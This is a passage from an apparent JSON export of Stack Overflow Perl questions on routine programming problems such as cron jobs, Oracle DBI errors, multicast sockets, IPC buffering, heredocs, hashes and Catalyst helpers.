$port-&gt;write('2'); # Signal to set pin 3 low\n                        print \"Sent cmd: 2\\n\";\n                        $stop = 1;\n                };\n                $signalOut = $port-&gt;write('1'); # Signal to arduino to set pin 3 High\n                print \"Sent cmd: 1\\n\";\n                print \"Waiting for plant bed to fill...\\n\";\n                print LOG \"Alarm is being set.\\n\";\n                alarm (420);\n                print LOG \"Alarm is set.\\n\";\n                while ($stop == 0) {\n                        print LOG \"In while-sleep loop.\\n\";\n                        sleep(2);\n                }\n                print LOG \"The loop has been escaped.\\n\";\n                die \"Done.\";\n                print LOG \"No one should ever see this.\";\n    }\n    else {\n        my $pid = fork();\n        $SIG{'INT'} = sub {\n            waitpid($pid,0) if $pid != 0; exit(0);\n        };\n\n        # What child process should do\n        if($pid == 0) {\n            # Poll to see if any data is coming in\n            print \"\\nListening...\\n\\n\";\n            while (1) {\n                my $incmsg = $port-&gt;lookfor(9);\n                # If we get data, then print it\n                if ($incmsg) {\n                    print \"\\nFrom arduino: \" . $incmsg . \"\\n\\n\";\n                }\n            }\n        }\n        # What parent process should do\n        else {\n                    sleep(1);\n                    my $choice = ' ';\n                    print \"Please pick an option you'd like to use:\\n\";\n                    while(1) {\n                        print \" [1] Cycle  [2] Relay OFF  [3] Relay ON  [4] Config  [$lastChoice]: \";\n                        chomp($choice = &lt;STDIN&gt;);\n                        switch ($choice) {\n                                case /1/ {\n                                        $SIG{ALRM} = sub {\n                                                        print \"Expecting plant bed to be full; please check.\\n\";\n                                                        $signalOut = $port-&gt;write('2'); # Signal to set pin 3 low\n                                                        print \"Sent cmd: 2\\n\";\n                                                        };\n                                        $signalOut = $port-&gt;write('1'); # Signal to arduino to set pin 3 High\n                                        print \"Sent cmd: 1\\n\";\n                                        print \"Waiting for plant bed to fill...\\n\";\n                                        alarm (420);\n                                        $lastChoice = $choice;\n                                }\n                                case /2/ {\n                                        $signalOut = $port-&gt;write('2'); # Signal to set pin 3 low       \n                                        print \"Sent cmd: 2\";\n                                        $lastChoice = $choice;\n                                }\n                                case /3/ {\n                                        $signalOut = $port-&gt;write('1'); # Signal to arduino to set pin 3 High\n                                        print \"Sent cmd: 1\";\n                                        $lastChoice = $choice;\n                                }\n                                case /4/ {\n                                        print \"There is no configuration available yet. Please stab the developer.\";\n                                }\n                            else        { print \"Please select a valid option.\\n\\n\";}\n                        }\n                   }\n           }\n}\n</code></pre>\n\n<p>When I run <code>ps -ef</code> I find the following output:</p>\n\n<pre><code>dburke   15294 15293  0 14:30 ?        00:00:00 /bin/sh -c /home/dburke/scripts/hal/bin/main.pl cycle\ndburke   15295 15294  0 14:30 ?        00:00:00 /usr/bin/perl -w /home/dburke/scripts/hal/bin/main.pl cycle\n</code></pre>\n\n<p>Shouldn't there only be one process?  Is it forking even though it received the cycle argument and the fork is outside of the cycle argument's <code>if</code> block?</p>\n\n<p>Any idea why it wouldn't die from the statement <code>die \"Done.\";</code>?  It runs fine from the command line and interprets the 'cycle' argument fine.  When it runs in cron it runs fine, however, the process never dies and while each process doesn't continue to cycle the system it does seem to be looping in some way due to the fact that it ups my system load very quickly. </p>\n\n<p>If you'd like more information, just ask.  Thanks guys!</p>\n"},{"tags":["perl","oracle","dbi"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12646929,"title":"Oracle DBI perl module on Solaris 5.10","body":"<p>I am trying to write a simple perl script that checks some data in ORCL.</p>\n\n<p>My PERL5LIB is set to</p>\n\n<p>/opt/oracle/product/client10.2.0.3/perl/lib/site_perl/5.8.3/sun4-solaris-thread-multi-64</p>\n\n<p>which is the parent dir for DBD/Oracle.pm</p>\n\n<p>However, when I run</p>\n\n<pre><code>&gt; perl -e 'use DBD::Oracle; print $DBD::Oracle::VERSION,\"\\n\";'\n</code></pre>\n\n<p>I get the following error:</p>\n\n<pre><code>Can't load '/opt/oracle/product/client10.2.0.3/perl/lib/site_perl/5.8.3/sun4-solaris-thread-multi-64/auto/DBI/DBI.so' for module DBI: ld.so.1: perl: fatal: /opt/oracle/product/client10.2.0.3/perl/lib/site_perl/5.8.3/sun4-solaris-thread-multi-64/auto/DBI/DBI.so: wrong ELF class: ELFCLASS64 at /usr/perl5/5.8.4/lib/sun4-solaris-64int/DynaLoader.pm line 230.\n at /opt/oracle/product/client10.2.0.3/perl/lib/site_perl/5.8.3/sun4-solaris-thread-multi-64/DBI.pm line 252\nBEGIN failed--compilation aborted at /opt/oracle/product/client10.2.0.3/perl/lib/site_perl/5.8.3/sun4-solaris-thread-multi-64/DBI.pm line 252.\nCompilation failed in require at /opt/oracle/product/client10.2.0.3/perl/lib/site_perl/5.8.3/sun4-solaris-thread-multi-64/DBD/Oracle.pm line 20.\nBEGIN failed--compilation aborted at /opt/oracle/product/client10.2.0.3/perl/lib/site_perl/5.8.3/sun4-solaris-thread-multi-64/DBD/Oracle.pm line 20.\nCompilation failed in require at -e line 1.\nBEGIN failed--compilation aborted at -e line 1.\n</code></pre>\n\n<p>In I run a script that tries to invoke DBD/DBI saying:</p>\n\n<pre><code>use DBI;\nuse DBD::Oracle;\n</code></pre>\n\n<p>I get</p>\n\n<pre><code>Can't load '/opt/oracle/product/client10.2.0.3/perl/lib/site_perl/5.8.3/sun4-solaris-thread-multi-64/auto/DBI/DBI.so' for module DBI: ld.so.1: perl: fatal: /opt/oracle/product/client10.2.0.3/perl/lib/site_perl/5.8.3/sun4-solaris-thread-multi-64/auto/DBI/DBI.so: wrong ELF class: ELFCLASS64 at /usr/perl5/5.8.4/lib/sun4-solaris-64int/DynaLoader.pm line 230.\n at /opt/oracle/product/client10.2.0.3/perl/lib/site_perl/5.8.3/sun4-solaris-thread-multi-64/DBI.pm line 252\nBEGIN failed--compilation aborted at /opt/oracle/product/client10.2.0.3/perl/lib/site_perl/5.8.3/sun4-solaris-thread-multi-64/DBI.pm line 252.\n</code></pre>\n\n<p>Interestingly enough, before setting PERL5LIB, when I run</p>\n\n<pre><code>&gt; perl -e 'use DBI; print $DBI::VERSION,\"\\n\";'\n</code></pre>\n\n<p>I get 1.58.  But when I run the same exact command after setting PERL5LIB, I get an error similar to the one above for DBD::Oracle\nWhat am I missing?</p>\n\n<p>Thanks</p>\n"},{"tags":["perl","algorithm","binary","decimal"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":3273,"score":3,"question_id":2821294,"title":"How do I convert decimal numbers to binary in Perl?","body":"<p>I am trying to make a program that converts decimal numbers or text into binary numbers in perl. The program asks for user input of a character or string , and then prints out the result to the console. How do I do this? My code I have been working on is below, but i cannot seem to fix it.</p>\n\n<pre><code>print \"Enter a number to convert: \";\nchomp($decimal = &lt;STDIN&gt;);\nprint \"\\nConverting $number to binary...\\n\";\n$remainder = $decimal%2;\nwhile($decimal &gt; 0)\n{\n    $decimal/2;\n    print $remainder;\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":91,"score":-2,"question_id":12644322,"title":"How to write the current timestamp in a file perl?","body":"<p>How to write the current timestamp in a Perl file?  </p>\n\n<p>I have made a file named <code>myperl.pl</code> which will print the current timestamp. The file is given below:  </p>\n\n<pre><code>#!/usr/local/bin/perl\n@timeData = localtime(time);\nprint \"@timeData\\n\";\n</code></pre>\n\n<p>Now I am trying to redirect the output of this file into another text file. The script is below:  </p>\n\n<pre><code>#!/usr/local/bin/perl\n@myscript = \"/usr/bin/myperl.pl\";\n@myfile = \"/usr/bin/output_for_myperl.txt\";\nperl \"myscript\" &gt; \"myfile\\n\";\n</code></pre>\n\n<p>While running this I am getting below error:  </p>\n\n<blockquote>\n  <p>perl sample_perl_script.pl<br>\n  String found where operator expected at sample_perl_script.pl line 4, near \"perl \"myscript\"\"<br>\n  (Do you need to predeclare perl?)<br>\n  syntax error at sample_perl_script.pl line 4, near \"perl \"myscript\"\"<br>\n  Execution of sample_perl_script.pl aborted due to compilation errors.</p>\n</blockquote>\n"},{"tags":["html","perl","module","tree","html-tree"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":154,"score":-1,"question_id":4850264,"title":"How exactly does the \"parent\" function from HTML::TreeBuilder work?","body":"<p>The <a href=\"https://metacpan.org/module/HTML%3a%3aElement\" rel=\"nofollow\">documentation on CPAN</a> doesn't really explain this behavior unless I'm missing something. I've put together some quick test code to illustrate my problem:</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\n\nuse HTML::TreeBuilder;\n\nmy $testHtml = \" \n&lt;body&gt;\n        &lt;h1&gt;\n                &lt;p&gt; \n                        &lt;p&gt;HELLO!\n                        &lt;/p&gt; \n                &lt;/p&gt; \n        &lt;/h1&gt;\n&lt;/body&gt;\";\n\nmy $parsedPage = HTML::TreeBuilder-&gt;new;\n$parsedPage-&gt;parse($testHtml);\n$parsedPage-&gt;eof();\n\nmy @p = $parsedPage-&gt;look_down('_tag' =&gt; 'p');\n\nforeach (@p) {print $_-&gt;parent-&gt;tag, \" : \", $_-&gt;tag, \"\\t\", $_-&gt;as_text, \"\\n\";}\n</code></pre>\n\n<p>After running the above script, the output is:</p>\n\n<pre><code>body : p\n\nbody : p        HELLO! \n</code></pre>\n\n<p>Seeing as all the tags are nested one after another, I would think that the parent of the first <code>p</code> tag would be <code>h1</code>, and the parent of the second <code>p</code> tag would be <code>p</code>.  Why is the parent function showing the <code>body</code> tag for both?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12370282,"title":"When I create a daemon with perl and write something to a file, it fails","body":"<p>I use daemonize to create a daemon process and then write something to the file named log,\nbut when I ran it, it did not work.</p>\n\n<p>Why could I not write to the log?</p>\n\n<pre><code>use POSIX;\n\nsub daemonize{\n    chdir '/';\n    umask 0;\n    open STDIN,'/dev/null'   || die \"can not open /dev/null:$!\";\n    open STDOUT,'&gt;/dev/null' || die \"can not open /dev/null:$!\";\n    open STDERR,'&gt;/dev/null' ||die \"can not open /dev/null:$!\";\n    defined ($pid=fork) || die \"can not fork a process:$!\";\n    exit if $pid;\n    setsid || die \"can not create session:$!\";\n}\n\n&amp;daemonize;\nopen LOG,\"&gt;&gt;/dev02/ycq/test/log\" ||die \"can not open file:$!\";\nmy $num=0;\nwhile(1){\n    print LOG \"$num\\n\";\n    sleep 1;\n}\n</code></pre>\n"},{"tags":["perl","sockets","udp","multicast"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12645760,"title":"Send and Receive using multicast hanging in Perl","body":"<p>I am having an issue where if I am not getting broadcasted packets coming in then it won't send packets out. I read a bit about Blocking for sockets but it doesn't seem to be available for multicast and I am pretty sure that is where the issue is since that is the only thing being used by both routines.</p>\n\n<p>Is there a better way to do this? Any suggestions on what the issue is?</p>\n\n<p>All the script should do is be a middle man for an application to handle multicast support for it, so it just listens for data over multicast and then sends it to the application and any data coming out of the application broadcasts it.\nHere is my code:</p>\n\n<pre><code>#! usr/bin/perl -w\n\n#----------------------------Includes-------------------------------------------\nuse IO::Socket;\nuse IO::Socket::Multicast;\nuse Threads;\nrequire \"./IPAddressHelperFunctions.pl\";\n\n#----------------------------Constants------------------------------------------\nuse constant MAX_PACKET_LENGTH =&gt; 1500; #Max Packet Length\nuse constant ADDRESS =&gt; '';             #IP address used for multicast (if not\n                                        #valid or removed, it is auto-grabbed and\n                                        #user is prompted if more than one)\nuse constant GROUP =&gt; '233.0.25.2';     #Multicast Group\nuse constant MPORT =&gt; 20000;            #Multicast Port\nuse constant INPORT =&gt; 28000;           #In to Application Port\nuse constant OUTPORT =&gt; 30000;          #Out from Application Port\nuse constant PROTO =&gt; 'udp';            #Protocol to use\n\n#If no ip address is defined find it\nmy $ipAddress = ADDRESS;\nif(!isIpAddress($ipAddress))\n{\n    $ipAddress = chooseIpAddress();\n    if($ipAddress eq \"\")\n    {\n        my $temp = &lt;&gt;;\n        exit 0;\n    }\n}\n\n#----------------------------Socket Setup---------------------------------------\n#Standard Socket to Communicate with Application\nmy $appS = IO::Socket::INET-&gt;new(Proto     =&gt; PROTO,\n                                    PeerAddr  =&gt; 'localhost',\n                                    PeerPort  =&gt; INPORT)\n                                    or die \"Can't bind app send: $@\\n\";\n\nmy $appL = IO::Socket::INET-&gt;new(Proto     =&gt; PROTO,\n                                    LocalAddr =&gt; 'localhost',\n                                    LocalPort =&gt; OUTPORT)\n                                    or die \"Can't bind app listen: $@\\n\";\n\n# Socket to listen/send command packets on/to\nmy $bcastCP = IO::Socket::Multicast-&gt;new(Proto       =&gt; PROTO,\n                                         LocalAddr   =&gt; $ipAddress,\n                                         LocalPort   =&gt; MPORT,\n                                         ReuseAddr   =&gt; 1,\n                                         PeerPort    =&gt; MPORT)\n                                         or die \"Can't bind bcastCP: $@\\n\";\n\n# set our mutlicast address to listen on\n$bcastCP-&gt;mcast_add(GROUP,$ipAddress) || die \"Couldn't set group: $!\\n\";\n\n# Turn on loopbacking (had bug when it was off)\n$bcastCP-&gt;mcast_loopback(1);\n\n#----------------------------Send/Recieve Data----------------------------------\n#Start a thread to listen for app data and send it to the network\nmy $appThread = threads-&gt;create('getFromApp');\n$appThread-&gt;detach();\n\n#loop to listen for network data and send it to app\nwhile(1)\n{\n     my $InCPdata;\n     $bcastCP-&gt;recv($InCPdata, MAX_PACKET_LENGTH,0);\n\n     #check the data and ready it for app then send it to app\n     if($InCPdata)\n     {\n          $appS-&gt;send(\"CPB\".$InCPdata);\n          print(\"Packet sent to app\\n\");\n     }\n}\n\n#----------------------------Close Sockets--------------------------------------\n$appL-&gt;close();\n$appS-&gt;close();\n$bcastCP-&gt;close();\n\n#----------------------------Subroutines--------------------------------------\n#----------------------------------------------------\n# Name: get From App\n# Written By: Nathan Bowhay\n#\n# Args:\n# None\n#\n# Description:\n# Listens for data coming out of application and broadcast it to the network\n# using multicast\n#-----------------------------------------------------\nsub getFromApp{\n\n     while(1)\n     {\n          my $OutCPdata;\n          $appL-&gt;recv($OutCPdata, MAX_PACKET_LENGTH,0);\n          if($OutCPdata)\n          {\n               $bcastCP-&gt;mcast_send($OutCPdata, GROUP.':'.MPORT);\n               print(\"Packet send OUT\\n\");\n          }\n     }\n\n     return 1;\n}\n</code></pre>\n\n<p>PS: this code was modified a bit to try and hide some stuff. Also if you need to look at the script that i use to grab an ip address just let me know, but it is pretty simple, it just uses ipconfig to get the local ip address of the machine. </p>\n"},{"tags":["perl","svn","pre-commit-hook"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":721,"score":2,"question_id":1689052,"title":"How can I access the commited file from a Subversion pre-commit hook in Perl?","body":"<p>I need to do the following:</p>\n\n<ol>\n<li><p>Write pre-commit hook in Perl</p></li>\n<li><p>Hook should check all files being committed for presence of some text, and fail if that text is not found</p></li>\n</ol>\n\n<p><strong>Basically, I need an example of Perl hook that reads files being committed.</strong> </p>\n\n<p>I am really looking for some elegant solution with the least amount of code.</p>\n\n<p>Notes:\nHook should use <code>svnlook</code> or other better way to find files.</p>\n"},{"tags":["perl","perl-data-structures"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12644402,"title":"Perl hashref printing keys","body":"<p>I have the following hashref :-</p>\n\n<pre><code>my $hashref = {'a'=&gt;(1,2,3,4),\n               'b'=&gt;(5,6,7,8)};\n</code></pre>\n\n<p>then I use the following to just print the keys (i.e. 'a' and 'b') :-</p>\n\n<pre><code>foreach (keys %$hashref){\n   print \"\\n\".$_.\"\\n\";\n}\n</code></pre>\n\n<p>This prints the following output:-</p>\n\n<pre><code>4\n\na\n\n7\n\n2\n\n5\n</code></pre>\n\n<p>Trying to print the datastructure hashref using Data::Dumper gives the following output:-</p>\n\n<pre><code>$VAR1 = {\n          '4' =&gt; 'b',\n          'a' =&gt; 1,\n          '7' =&gt; 8,\n          '2' =&gt; 3,\n          '5' =&gt; 6\n       };\n</code></pre>\n\n<p>My question is :-</p>\n\n<p>1) How to just print the correct keys i.e. 'a' and 'b'.\n2) Why does the data structure look like the one in the above output and not like:-</p>\n\n<pre><code>$VAR1 = {\n           'a' =&gt; (1,2,3,4),\n           'b' =&gt; (5,6,7,8)\n        };\n</code></pre>\n"},{"tags":["perl","parsing","unix","awk","pipe"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":12633664,"title":"Piping output from awk to perl","body":"<p>I want to make an array in Perl with the values obtained from my awk script. Then I can do math on them in Perl. </p>\n\n<p>Here is my Perl, which runs a program, which saves a text file:</p>\n\n<pre><code>my $unix_command_dsc = (`./program -s test.fasta saved_file.txt`);\nmy $dsc_run = qx($unix_command_dsc);\n</code></pre>\n\n<p>Now I have some Awk that parses that data saved in the text file:   </p>\n\n<pre><code>#!/usr/bin/awk -f\n\nBEGIN{       # Initialize the values to zero. Note, done automatically also.\n    sumc4 = 0\n    sumc5 = 0\n    sumc6 = 0\n}\n\n/^[1-9][0-9]* residue/ {next}    #Match line that begins with number and has word 'residue', skip it.\n/^[1-9]/ {                       #Match line that begins with number.\n\n    sumc4 += $4                  #Add up the values of the nth column into the variables.\n    sumc5 += $5\n    sumc6 += $6\n\n    print $4 \"\\t\" $5 \"\\t\" $6    #This will show the whole columns. \n\n    }\n\nEND{\n    print \"sum H\" \"\\t\" \"sum E\" \"\\t\" \"sum C\"\n    print sumc4 \"\\t\" sumc5 \"\\t\" sumc6  \n}\n</code></pre>\n\n<p>I run this Awk from terminal with the following commands:</p>\n\n<pre><code>./awk_program.txt saved_file.txt \n</code></pre>\n\n<p>Any ideas how I would gather this data from the print statements in awk into arrays in perl?</p>\n\n<p>What I've tried is to just run that awk script in perl:</p>\n\n<pre><code>my $unix_command_awk = (`./awk_program.txt saved_file.txt`);\nmy $awk_run = qx($unix_command_awk);\n</code></pre>\n\n<p>But perl gives me errors and commands not found, like it thinks the data are commands. Should there be a STDOUT in the awk that I'm missing, rather than print?</p>\n"},{"tags":["perl","ipc","pipe","output-buffering","tty"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":92,"score":1,"question_id":12643325,"title":"Perl bidirectional pipe IPC, how to avoid output buffering","body":"<p>I am trying to communicate with  an interactive process.  I want my perl script to be a \"moddle man\" between the user and the process.  The process puts text to stdout, prompts the user for a command, puts more text to stdout, prompts the user for a command, .......  A primitive graphic is provided:</p>\n\n<pre><code> User &lt;----STDOUT---- interface.pl &lt;-----STDOUT--- Process\n User -----STDIN----&gt; interface.pl ------STDIN---&gt; Process\n User &lt;----STDOUT---- interface.pl &lt;-----STDOUT--- Process\n User -----STDIN----&gt; interface.pl ------STDIN---&gt; Process\n User &lt;----STDOUT---- interface.pl &lt;-----STDOUT--- Process\n User -----STDIN----&gt; interface.pl ------STDIN---&gt; Process\n</code></pre>\n\n<p>The following simulates what I'm trying to do:</p>\n\n<pre><code>    #!/usr/bin/perl\n\n    use strict;\n    use warnings;\n\n    use FileHandle;\n    use IPC::Open2;\n    my  $pid = open2( \\*READER, \\*WRITER, \"cat -n\" );\n    WRITER-&gt;autoflush(); # default here, actually\n    my $got = \"\";\n    my $input = \" \";\n\n    while ($input ne \"\") {\n            chomp($input = &lt;STDIN&gt;);\n            print WRITER \"$input \\n\";\n            $got = &lt;READER&gt;;\n            print $got;\n    }\n</code></pre>\n\n<p>DUe to output buffering the above example does not work.  No matter what text is typed in, or how many enters are pressed the program just sits there.  The way to fix it is to issue:</p>\n\n<pre><code>    my  $pid = open2( \\*READER, \\*WRITER, \"cat -un\" );\n</code></pre>\n\n<p>Notice \"cat -un\" as opposed to just \"cat -n\".  -u turns off output buffering on cat.  When output buffering is turned off this works.  The process I am trying to interact with most likely buffers output as I am facing the same issues with \"cat -n\".  Unfortunately I can not turn off output buffering on the process I am communicating with, so how do I handle this issue?</p>\n\n<p>UPDATE1 (using ptty):</p>\n\n<pre><code>    #!/usr/bin/perl\n\n    use strict;\n    use warnings;\n\n    use IO::Pty;\n    use IPC::Open2;\n\n    my $reader = new IO::Pty;\n    my $writer = new IO::Pty;\n\n    my  $pid = open2( $reader, $writer, \"cat -n\" );\n    my $got = \"\";\n    my $input = \" \";\n\n    $writer-&gt;autoflush(1);\n\n    while ($input ne \"\") {\n            chomp($input = &lt;STDIN&gt;);\n            $writer-&gt;print(\"$input \\n\");\n            $got = $reader-&gt;getline;\n            print $got;\n    }\n</code></pre>\n\n<p>~                    </p>\n"},{"tags":["perl","namespaces","package","subroutine"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12644016,"title":"How can I call a subroutine declared in another package without prefixing the subroutine name with its package name?","body":"<p>I'm not entirely sure this is possible, but I would like to simply shorten the name of the subroutine I'm calling declared in another package by just omitting the package name.</p>\n\n<p>For example, I have a module defined:</p>\n\n<pre><code>package Package1;\n\nuse strict;\nuse warnings;\n\nBEGIN \n{\n  require Exporter;\n  our @ISA = qw( Exporter );\n  our @EXPORT_OK = qw( subroutine1 );\n}\n\nsub subroutine1\n{\n  print \"Hello!$/\";\n}\n\nreturn 1;\n</code></pre>\n\n<p>And I have a driver application defined:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse Package1;\n\n&amp;Package1::subroutine1;\n</code></pre>\n\n<p>The only way I can seem to shorten the call to <code>subroutine1</code> is with making an alias like the following:</p>\n\n<pre><code>*s1 = \\&amp;Package1::subroutine1;\n&amp;s1;\n</code></pre>\n\n<p>Surely I'm being a doofus and missing something here.. Is there a cleaner way to achieve this?</p>\n"},{"tags":["linux","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":69,"score":0,"question_id":12639174,"title":"perl byte code genration with too many file.pl","body":"<p>How to make perl bytecode if sub is there in another file.pl so that I can get all perl script in to binary to give for usage but I am getting codedump warning.</p>\n\n<p>Here is the example how I have done!</p>\n\n<p>File: add.pl</p>\n\n<pre><code>require \"util.pl\";\n\n$a = 1;\n\n$b = 2;\n\n$res = add($a,$b);\n\nprint $res;\n</code></pre>\n\n<p>File: util.pl</p>\n\n<pre><code>sub add()\n\n{\n\nmy ($a,$b) = @_;\n\n\nmy $c = $a + $b;\n\nreturn $c;\n\n}\n\n1; #to return true\n</code></pre>\n\n<p>Then when I run:</p>\n\n<pre><code>perlcc add.pl\n\n./a.out\n</code></pre>\n\n<p>I get</p>\n\n<pre><code>Segmentation fault (core dumped)\n</code></pre>\n\n<p>I also tried</p>\n\n<pre><code>perlcc add.pl util.pl\n</code></pre>\n\n<p>but it says</p>\n\n<pre><code>/usr/bin/perlcc: using add.pl as input file, ignoring util.pl\n</code></pre>\n\n<p>Note:</p>\n\n<p>If both are in single file</p>\n\n<pre><code>perlcc file.pl \n</code></pre>\n\n<p>and </p>\n\n<pre><code>./a.out \n</code></pre>\n\n<p>will work</p>\n"},{"tags":["perl","heredoc"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12643016,"title":"Perl Here-Document Frustrations","body":"<p>I seem to be having a hard time getting my here-document to work properly.  I have a chunk of text that I need stuffed into a variable and remain un-interpolated.</p>\n\n<p>Here's what I have:</p>\n\n<pre><code>my $move_func &lt;&lt;'FUNC';\nfunction safemove\n{\n    if [[ ! -f $1 ]] ; then echo \"Source File Not Found: $1\"; return 1; fi\n    if [[ ! -r $1 ]] ; then echo \"Cannot Read Source File: $1\"; return 2; fi\n    if [[ -f $2 ]]   ; then echo \"Destination File Already Exists: $1 -&gt; $2\"; return 3; fi\n    mv $1 $2\n}\nFUNC\n\n# Do stuff with $move_func\n</code></pre>\n\n<p>Which gives me</p>\n\n<pre><code>Scalar found where operator expected at ./heredoc.pl line 9, near \"$1 $2\"\n        (Missing operator before $2?)\nSemicolon seems to be missing at ./heredoc.pl line 10.\nsyntax error at ./heredoc.pl line 6, near \"if\"\nsyntax error at ./heredoc.pl line 10, near \"$1 $2\n\"\nExecution of ./heredoc.pl aborted due to compilation errors.\n</code></pre>\n\n<hr>\n\n<p>However, the following works as expected:</p>\n\n<pre><code>print &lt;&lt;'FUNC';\nfunction safemove\n{\n    if [[ ! -f $1 ]] ; then echo \"Source File Not Found: $1\"; return 1; fi\n    if [[ ! -r $1 ]] ; then echo \"Cannot Read Source File: $1\"; return 2; fi\n    if [[ -f $2 ]]   ; then echo \"Destination File Already Exists: $1 -&gt; $2\"; return 3; fi\n    mv $1 $2\n}\nFUNC\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["perl","hash","key","duplicates"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":113,"score":1,"question_id":12639688,"title":"finding duplicate hash keys in perl and finding maximum value among them","body":"<p>my data is in a file basically like :</p>\n\n<pre><code>a\n2\nb\n6\na\n4\nf\n2\nb\n1\na\n7\n</code></pre>\n\n<p>I have this hash :</p>\n\n<pre><code>%hash = {\n    a =&gt; 2,\n    b =&gt; 6,\n    a =&gt; 4,\n    f =&gt; 2,\n    b =&gt; 1, \n    a =&gt; 7,\n};\n</code></pre>\n\n<p>How can I find duplicate keys and among them? I want the one that have the biggest value.</p>\n\n<p>Desired output:</p>\n\n<pre><code>a--&gt;7 \nb--&gt;6\nf--&gt;2\n</code></pre>\n"},{"tags":["perl","cpan","perl-module"],"answer_count":1,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":52,"score":5,"question_id":12640973,"title":"What is the purpose of two seperate META files after building a distribution?","body":"<p>When building a new distribution 2 meta files are generated. One uses the YAML format, and the other JSON. As far as I know, these are only used by other CPAN clients or other applications that want to have access to a meta file(for whatever reason). I'm trying to reason why an app would need access to both... </p>\n\n<p>Are these two formats separately generated purely for convenience? i.e. Developer 1 prefers JSON therefore codes his apps to read the distribution META.json file while Developer 2 hates JSON and would rather reach for the YAML version?</p>\n\n<p>Or is therefore some technical reason both would be needed by a single client/app that I'm overlooking?</p>\n"},{"tags":["perl","web-applications","dry","catalyst","subroutine"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":12639108,"title":"Catalyst: how declare a global subroutine","body":"<p>Hi i don't want to repeate the same code in the controllers, so i created a sub in the main MyApp package:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>sub do_stuff {\n    my $input = shift;\n\n    do something\n}\n</code></pre>\n\n<p>But then i want to use it in controller <code>MyApp::Controller::Foo</code></p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>sub test : Chained('base') Args(0) {\n    my ($self, $c) = @_;\n\n    my $test = do_stuff($c-&gt;request-&gt;params-&gt;{s});\n\n    do something more\n}\n</code></pre>\n\n<p>i get following error:</p>\n\n<blockquote>\n  <p>Caught exception in MyApp::Controller::Foo->test \"Undefined subroutine\n  &amp;MyApp::Controller::Foo::do_stuff called at\n  /home/student/workspace/MyApp/script/../lib/MyApp/Controller/Foo.pm\n  line 24,  line 1000.\"</p>\n</blockquote>\n\n<p><strong>How can i create a subroutine / function to use global in all Catalyst Controllers???</strong></p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":9618276,"title":"Extract numerical values using regex","body":"<p>I have a filename in the following format:</p>\n\n<pre><code>xx_xx_xx_xx/Run02/isf2sync_output/xx_xx_xx_xx_xx_Run02_xxx3_20120301_144327/xx_xx_xx_xx_xx_Run02_xxx3_20120301_144395.x.x.x.log\n</code></pre>\n\n<p>I want to extract the date from it, in this case <code>20120301144327</code> and <code>20120301144395</code>.</p>\n\n<p>I have been using <code>(\\d+)</code> to get the numerical value. How can i skip the first number values and get the desired one?</p>\n"},{"tags":["perl","cron","crontab","asterisk"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":79,"score":3,"question_id":12640764,"title":"Perl script running correctly, but as a crontab it does not work","body":"<p>I have a Perl script which inserts values in to a Mysql DB. Within the same script, I check a condition, and if successful,  go to the asterisk CLI and run the originate command.  When I run it in the terminal it's working properly.  When I set it as a crontab, it will update the DB but the originate command is not working.  I am new to Perl, please help me to solve this.  Thanks in advance.</p>\n\n<p>Perl script:</p>\n\n<pre><code>if($temperature &gt; 85){\n    print `asterisk -rx \"originate Dongle/dongle0/0123456789 extension 400\\@out\"`;\n}\n</code></pre>\n\n<p>Crontab:</p>\n\n<pre><code>*/1 * * * *   /home/test/bin/insert_mysql.pl\n</code></pre>\n"},{"tags":["perl","batch-file"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1080,"score":1,"question_id":2513682,"title":"How can I pause the console window in .pl and .bat file?","body":"<p>As I know, when I run <strong>cs myConsoleApp.cs</strong> from windows command line, I can pause the Console Window by add the code below:</p>\n\n<p><code>Console.ReadLine();</code></p>\n\n<p>Then How can I pause Console Window in myConsoleApp.pl and myConsoleApp.bat? I just want to monitor the running result from the Console window. Thank you.</p>\n\n<p>Suppose myConsoleApp.bat like this:</p>\n\n<pre><code>taskkill /f /im \"E1.exe\"\ntaskkill /f /im \"E2.exe\"\n\npause \n</code></pre>\n\n<p>Suppose myConsoleApp.pl like this:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nprint \"Hello World!\";\n\n&lt;&gt;;\n</code></pre>\n"},{"tags":["perl","strawberry-perl"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":4226,"score":0,"question_id":4655842,"title":"can't locate spreadsheet writeexcel.pm","body":"<p>i am getting Error </p>\n\n<blockquote>\n  <p>can't locate spreadsheet writeexcel.pm in @inc @inc contains </p>\n</blockquote>\n\n<p>yes i know, it require the excel 